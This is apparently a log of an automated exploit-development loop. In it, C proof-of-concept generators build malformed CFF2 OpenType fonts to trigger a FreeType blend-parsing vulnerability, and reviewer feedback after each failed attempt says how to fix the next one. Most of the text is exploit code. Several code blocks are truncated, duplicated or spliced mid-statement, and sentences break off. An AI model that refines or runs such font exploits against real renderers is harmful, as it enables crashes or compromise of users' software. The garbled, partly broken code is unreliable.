    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);

    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);

    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Root Cause

The PoC fails because **the Private DICT is too small**. The `Private` operator in the Font DICT encodes `private_len` as a 1-byte integer (using `fputc(0x8B, f)` which pushes value 0), but the actual Private DICT size is much larger than 139. The generator patches the push value to `private_len + 139`, but the initial `0x8B` only pushes a single-byte value of 0 — this is overwritten later, but the **overall DICT operand encoding is fundamentally broken**.

The key issue: CFF2 requires `private_len` to be encoded as a proper multi-byte integer if it exceeds 100. The generator uses `fputc(0x8B, f)` (one-byte integer 0) then later **re-seeks** and overwrites it with a single byte. This only works
```

</details>

> ## Analysis  The previous payload failed because the Private DICT size encoding was incorrect. The confirmed constants show `each = 55` operands per blend, so `numBlend...

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }

    /* ========== OpenType header ========== */
    fputc('O', f); fputc('T', f); fputc('T', f); fputc('O', f); /* sfVersion = 'OTTO' */
    write_uint16(f, 2);  /* numTables = 2 */
    write_uint16(f, 0);  /* searchRange */
    write_uint16(f, 0);  /* entrySelector */
    write_uint16(f, 0);  /* rangeShift */

    /* ========== Table 1: CFF2 ========== */
    fputc('C', f); fputc('F', f); fputc('F', f); fputc('2', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long cff2_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* ========== CFF2 data ========== */
    long cff2_start = ftell(f);

    /* CFF2 Header: exactly 5 bytes */
    fputc(0x02, f); /* major */
    fputc(0x00, f); /* minor */
    fputc(0x05, f); /* hdrSize */

    /* topDictLength (2 bytes) - placeholder */
    long tdl_pos = ftell(f);
    write_uint16(f, 0);

    /* ========== Top DICT ========== */
    long topdict_start = ftell(f);

    /* Version (SID 0) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x00, f); /* operator 0 = version */

    /* FDSelect: push offset, then escaped 12 30 */
    long fdselect_offset_pos = ftell(f);
    fputc(0x28, f); /* 4-byte integer prefix */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x1E, f); /* FDSelect = 12 30 */

    /* CharStrings: push offset, then escaped 17 */
    long charstrings_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x11, f); /* CharStrings = 17 */

    /* FDArray: push offset, then escaped 12 36 */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f);
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x0C, f); /* escape */
    fputc(0x24, f); /* FDArray = 12 36 */

    long topdict_end = ftell(f);
    long topdict_len = topdict_end - topdict_start;

    /* Patch topDictLength */
    fseek(f, tdl_pos, SEEK_SET);
    write_uint16(f, (uint16_t)topdict_len);
    fseek(f, topdict_end, SEEK_SET);

    /* ========== Global Subr INDEX (empty) ========== */
    write_uint32(f, 0); /* count = 0 */

    /* ========== FDSelect ========== */
    long fdselect_start = ftell(f);
    long fdselect_offset_from_cff2 = fdselect_start - cff2_start;

    fseek(f, fdselect_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdselect_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdselect_offset_from_cff2 >> 8) & 0xff, f);
    fputc(fdselect_offset_from_cff2 & 0xff, f);
    fseek(f, fdselect_start, SEEK_SET);

    /* FDSelect format 0: 1 glyph, FD index 0 */
    fputc(0x00, f);              /* format = 0 */
    write_uint16(f, 1);          /* nGlyphs = 1 */
    fputc(0x00, f);              /* fdArray[0] = 0 */

    /* ========== CharStrings INDEX ========== */
    long charstrings_start = ftell(f);
    long charstrings_offset_from_cff2 = charstrings_start - cff2_start;

    fseek(f, charstrings_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((charstrings_offset_from_cff2 >> 24) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 16) & 0xff, f);
    fputc((charstrings_offset_from_cff2 >> 8) & 0xff, f);
    fputc(charstrings_offset_from_cff2 & 0xff, f);
    fseek(f, charstrings_start, SEEK_SET);

    /* CharStrings INDEX: 1 glyph */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */
    fputc(0x8B, f);     /* push 0 */
    fputc(0x0E, f);     /* endchar = 14 */

    /* ========== FDArray INDEX ========== */
    long fdarray_start = ftell(f);
    long fdarray_offset_from_cff2 = fdarray_start - cff2_start;

    fseek(f, fdarray_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((fdarray_offset_from_cff2 >> 24) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 16) & 0xff, f);
    fputc((fdarray_offset_from_cff2 >> 8) & 0xff, f);

    fseek(f, fdarray_start, SEEK_SET);

    /* FDArray INDEX: 1 Font DICT (CFF2: 32-bit count) */
    write_uint32(f, 1); /* count = 1 */
    fputc(0x01, f);     /* offSize = 1 */
    fputc(0x01, f);     /* offset[0] = 1 */

    long fontdict_start = ftell(f);

    /* Font DICT: just Private operator with 4-byte size encoding */
    long private_offset_pos = ftell(f);
    fputc(0x28, f); /* 4-byte integer prefix for private_len */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); /* placeholder */
    fputc(0x28, f); /* 4-byte integer prefix for private_offset */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    /* Patch FDArray offset[1] */
    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    /* Patch private_offset in Font DICT */
    fseek(f, private_offset_pos + 4, SEEK_SET); /* skip private_len placeholder */
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 (CFF2 opcode 0x16) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x16, f); /* vsindex = CFF2 code 22 */

    /* First blend: numBlends=55, then 55 pairs (CFF2 opcode 0x17) */
    fputc(0xC2, f); /* push 55 (55+139=194=0xC2) */
    int i;
    for (i = 0; i < 55; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    /* Second blend: numBlends=55, then 55 pairs */
    fputc(0xC2, f); /* push 55 */
    for (i = 0; i < 55; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch private_len in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((private_len >> 24) & 0xff, f);
    fputc((private_len >> 16) & 0xff, f);
    fputc((private_len >> 8) & 0xff, f);
    fputc(private_len & 0xff, f);
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}

    long private_offset_pos = ftell(f);
    fputc(0x28, f); /* 4-byte integer prefix for private_len */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x28, f); /* 4-byte integer prefix for private_offset */
    fputc(0x00, f); fputc(0x00, f); fputc(0x00, f); fputc(0x00, f);
    fputc(0x12, f); /* Private operator */

    long fontdict_end = ftell(f);
    long fontdict_len = fontdict_end - fontdict_start;

    /* Patch FDArray offset[1] */
    fseek(f, fontdict_start - 1, SEEK_SET);
    fputc((uint8_t)(fontdict_len + 1), f);
    fseek(f, fontdict_end, SEEK_SET);

    /* ========== Private DICT ========== */
    long private_start = ftell(f);
    long private_offset_from_cff2 = private_start - cff2_start;

    /* Patch private_offset in Font DICT */
    fseek(f, private_offset_pos + 4, SEEK_SET);
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_start, SEEK_SET);

    /* Private DICT: vsindex 0 (CFF2 opcode 0x16) */
    fputc(0x8B, f); /* push 0 */
    fputc(0x16, f); /* vsindex = CFF2 code 22 */

    /* First blend: numBlends=10, then 10 pairs (CFF2 opcode 0x17) */
    fputc(0x99, f); /* push 10 */
    int i;
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    /* Second blend: numBlends=10, then 10 pairs */
    fputc(0x99, f); /* push 10 */
    for (i = 0; i < 10; i++) {
        fputc(0x8B, f); /* push 0 (value) */
        fputc(0x8B, f); /* push 0 (delta) */
    }
    fputc(0x17, f); /* blend = CFF2 code 23 */

    long private_end = ftell(f);
    long private_len = private_end - private_start;

    /* Patch private_len in Font DICT */
    fseek(f, private_offset_pos, SEEK_SET);
    fputc(0x28, f);
    fputc((private_len >> 24) & 0xff, f);
    fputc((private_len >> 16) & 0xff, f);
    fputc((private_len >> 8) & 0xff, f);
    fputc(private_len & 0xff, f);
    fputc(0x28, f);
    fputc((private_offset_from_cff2 >> 24) & 0xff, f);
    fputc((private_offset_from_cff2 >> 16) & 0xff, f);
    fputc((private_offset_from_cff2 >> 8) & 0xff, f);
    fputc(private_offset_from_cff2 & 0xff, f);
    fputc(0x12, f);
    fseek(f, private_end, SEEK_SET);

    /* ========== VariationStore ========== */
    write_uint16(f, 1); /* format = 1 */
    long vs_start = ftell(f);
    long vrlo_pos = ftell(f);
    write_uint32(f, 0);
    write_uint16(f, 1); /* itemVariationDataCount = 1 */
    long ivdo_pos = ftell(f);
    write_uint32(f, 0);

    long vrl_start = ftell(f);
    long vrl_offset = vrl_start - vs_start;
    fseek(f, vrlo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)vrl_offset);
    fseek(f, vrl_start, SEEK_SET);

    write_uint16(f, 1); /* axisCount = 1 */
    write_uint16(f, 1); /* regionCount = 1 */
    write_uint16(f, 0); /* axisIndex */
    write_f2dot14(f, 0.0);
    write_f2dot14(f, 1.0);
    write_f2dot14(f, 1.0);

    long ivd_start = ftell(f);
    long ivd_offset = ivd_start - vs_start;
    fseek(f, ivdo_pos, SEEK_SET);
    write_uint32(f, (uint32_t)ivd_offset);
    fseek(f, ivd_start, SEEK_SET);

    write_uint16(f, 1); /* itemCount = 1 */
    write_uint16(f, 0); /* shortDeltaCount = 0 */
    write_uint16(f, 1); /* regionIndexCount = 1 */
    write_uint16(f, 0); /* regionIndexes[0] = 0 */
    write_uint16(f, 0); /* delta = 0 */

    long cff2_end = ftell(f);
    long cff2_len = cff2_end - cff2_start;

    /* Patch CFF2 table record */
    fseek(f, cff2_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)cff2_start);
    write_uint32(f, (uint32_t)cff2_len);

    /* ========== Table 2: fvar ========== */
    fputc('f', f); fputc('v', f); fputc('a', f); fputc('r', f); /* tag */
    write_uint32(f, 0); /* checksum placeholder */
    long fvar_offset_pos = ftell(f);
    write_uint32(f, 0); /* offset placeholder */
    write_uint32(f, 0); /* length placeholder */

    /* fvar table */
    long fvar_start = ftell(f);
    write_uint32(f, 0x00010000); /* version 1.0 */
    write_uint16(f, 20); /* axes array size (one axis = 20 bytes) */
    write_uint16(f, 0);  /* instance count = 0 */
    write_uint16(f, 0);  /* instance size = 0 */

    /* Axis record: 'wght' */
    fputc('w', f); fputc('g', f); fputc('h', f); fputc('t', f);
    write_fixed(f, 1.0);  /* min */
    write_fixed(f, 1.0);  /* default */
    write_fixed(f, 1.0);  /* max */
    write_uint16(f, 0);   /* flags */
    write_uint16(f, 0);   /* axisNameID */

    long fvar_end = ftell(f);
    long fvar_len = fvar_end - fvar_start;

    fseek(f, fvar_offset_pos, SEEK_SET);
    write_uint32(f, (uint32_t)fvar_start);
    write_uint32(f, (uint32_t)fvar_len);

    fclose(f);
    return 0;
}
```

**Feedback to next attempt:**
```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
##Final Analysis

**Root Cause**  
The CFF2 font constructed by the PoC lacks a `vstore` operator (opcode 0x18) in the Top DICT. Without this operator, FreeType never associates the VariationStore data that is physically present in the CFF2 table. When the Private DICT `blend` operator (0x17) is parsed, the font engine either ignores it or bails out early because no valid VariationStore is linked. Consequently, `cff_blend_doBlend` is never reached, the vulnerable code path is not executed, and the binary exits normally.

**What Must Be Fixed**  

1. **Add the `vstore` operator to the Top DICT.**  
   After the FDArray offset, push a 4‑byte integer (prefix `0x28`) containing the offset from the start of the CF
```

</details>

> ## Analysis  The previous payload failed because the Top DICT was missing the `vstore` operator (CFF2 opcode 0x18) that links the VariationStore data to the font. Without this operator, FreeType never associates the VariationStore with the subfont, so when the Private DICT `blend` operator (0x17) is parsed, `cff_blend_doBlend` bails out early because `blend->vstore` is NULL. #include <stdio.h>
#include <stdlib.h>
#include <stdint.h>

static void write_uint16(FILE *f, uint16_t v) {
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_uint32(FILE *f, uint32_t v) {
    fputc((v >> 24) & 0xff, f);
    fputc((v >> 16) & 0xff, f);
    fputc((v >> 8) & 0xff, f);
    fputc(v & 0xff, f);
}

static void write_fixed(FILE *f, double v) {
    int32_t val = (int32_t)(v * 65536.0);
    write_uint32(f, (uint32_t)val);
}

static void write_f2dot14(FILE *f, double v) {
    int16_t val = (int16_t)(v * 16384.0);
    write_uint16(f, (uint16_t)val);
}

int main(void) {
    FILE *f = fopen("/tmp/poc", "wb");

    fputc(0x01, f); /* offSize */

    fputc(0x11, f); /* CharStrings = 17 */

    /* FDArray: push offset, then escaped 12 36 */
    long fdarray_offset_pos = ftell(f);
    fputc(0x28, f);

    fputc(0x24, f); /* FDArray = 12 36 */

    /* ========== Global Subr INDEX (empty) ========== */
    write_uint32(f, 0); /* count = 0 */

    fputc(0x28, f);

```
The PoC executed but did not trigger the vulnerability.
Senior Engineer Analysis:
## Final Analysis

### Root Cause

The PoC failed because `cff_parse_blend` at line 953 in `cffparse.c` checks `if ( !priv->subfont )` before proceeding. In a CFF2 font, the Top DICT's private dict parsing (via `cff_subfont_load`) calls `cff_load_private_dict` which sets `priv->subfont = subfont`. However, for CFF2 CID fonts, the *private* DICT is loaded per Font DICT inside `cff_subfont_load`, but the *blend* operator is only handled in the Private DICT context governed by `CFF2_CODE_PRIVATE`.

The key issue is that in a CFF2 Top DICT, the parser run for the top dict uses `code = CFF2_CODE_TOPDICT`. However, `cff_subfont_load` then calls `cff_load_private_dict` which re-initializes the parser with `code = CF
```

</details>
